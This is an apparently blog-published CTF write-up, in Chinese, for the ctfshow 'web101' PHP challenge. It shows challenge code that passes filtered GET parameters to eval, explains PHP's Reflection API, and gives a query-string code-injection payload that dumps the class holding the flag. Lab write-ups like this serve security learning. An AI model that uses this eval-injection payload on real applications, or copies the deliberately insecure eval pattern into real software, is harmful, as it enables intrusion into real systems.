&lt;h1 id=&#34;web101&#34;&gt;&lt;a href=&#34;#web101&#34; class=&#34;headerlink&#34; title=&#34;web101&#34;&gt;&lt;/a&gt;web101&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-22 00:26:48
# @link: https://ctfer.com

*/

highlight_file(__FILE__);
include(&amp;quot;ctfshow.php&amp;quot;);
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET[&amp;#39;v1&amp;#39;];
$v2=$_GET[&amp;#39;v2&amp;#39;];
$v3=$_GET[&amp;#39;v3&amp;#39;];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0)&amp;#123;
    if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&amp;#39;|\,|\.|\;|\?|[0-9]/&amp;quot;, $v2))&amp;#123;
        if(!preg_match(&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&amp;#123;|\[|\&amp;quot;|\&amp;#39;|\,|\.|\?|[0-9]/&amp;quot;, $v3))&amp;#123;
            eval(&amp;quot;$v2(&amp;#39;ctfshow&amp;#39;)$v3&amp;quot;);
        &amp;#125;
    &amp;#125;

&amp;#125;

?&amp;gt;

Notice: Undefined index: v1 in /var/www/html/index.php on line 17

Notice: Undefined index: v2 in /var/www/html/index.php on line 18

Notice: Undefined index: v3 in /var/www/html/index.php on line 19
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;PHP Reflection API&lt;/code&gt; 反射API 是 &lt;code&gt;PHP5&lt;/code&gt; 才有的新功能，是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;code&gt;ReflectionClass&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作用&lt;/strong&gt;：通过类名字符串获取类的结构信息（&lt;strong&gt;不需要实例化对象&lt;/strong&gt;）。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class User &amp;#123;
    public $name;
    private $email;

    public function sayHello() &amp;#123;
        return &amp;quot;Hello&amp;quot;;
    &amp;#125;
&amp;#125;

$ref = new ReflectionClass(&amp;#39;User&amp;#39;);

echo $ref-&amp;gt;getName();               // 输出：User
print_r($ref-&amp;gt;getProperties());     // 输出属性列表
print_r($ref-&amp;gt;getMethods());        // 输出方法列表
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;2.&lt;code&gt;ReflectionObject&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作用&lt;/strong&gt;：与 &lt;code&gt;ReflectionClass&lt;/code&gt; 类似，但它操作的是&lt;strong&gt;对象实例&lt;/strong&gt;，&lt;strong&gt;不需要传类名。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$user = new User();
$refObj = new ReflectionObject($user);

echo $refObj-&amp;gt;getName();          // User
print_r($refObj-&amp;gt;getProperties()); // 所有属性
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;payload&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;让 &lt;code&gt;v2&lt;/code&gt; 执行 &lt;code&gt;echo new ReflectionClass(‘ctfshow’)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=1&amp;amp;v2=echo new ReflectionClass&amp;amp;v3=;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807003418005.png&#34; alt=&#34;image-20250807003418005&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&lt;strong&gt;处理后得到&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;8d616b28-a2a2-45b6-9da8-62469fd7a51
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;还差最后一位，需要爆破&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
